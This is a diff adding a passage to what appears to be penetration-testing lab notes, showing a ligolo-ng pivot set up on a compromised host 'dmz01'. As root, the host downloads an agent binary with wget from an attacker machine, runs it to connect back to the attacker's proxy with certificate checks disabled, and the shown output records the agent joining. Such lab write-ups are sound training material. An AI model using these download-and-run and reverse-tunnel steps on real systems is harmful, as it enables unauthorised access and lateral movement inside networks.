@@ -1064,3 +1064,34 @@ sudo ip link set tunnel1 up
 ```bash
 sudo ligolo-proxy -selfcert                               
 ```
+
+>DMZ01
+
+```bash
+root@dmz01:~# wget http://10.10.15.11:8081/agent
+--2026-11-10 20:51:48--  http://10.10.15.11:8081/agent
+Connecting to 10.10.15.11:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7164088 (6.8M) [application/octet-stream]
+Saving to: ‘agent’
+
+agent                       100%[===========================================>]   6.83M  1.03MB/s    in 5.5s    
+
+2026-11-10 20:51:53 (1.24 MB/s) - ‘agent’ saved [7164088/7164088]
+
+root@dmz01:~# chmod +x agent
+root@dmz01:~# ./^Cgolo-agent -connect 10.10.15.11:11601 -ignore-cert
+root@dmz01:~# ./agent -connect 10.10.15.11:11601 -ignore-cert
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="10.10.15.11:11601"
+
+
+```
+
+```
+ligolo-ng » INFO[0342] Agent joined.                                 id=0050568a405f name=root@dmz01 remote="10.129.229.147:53920"
+ligolo-ng » session
+? Specify a session : 1 - root@dmz01 - 10.129.229.147:53920 - 0050568a405f
+[Agent : root@dmz01] »  
+
+```
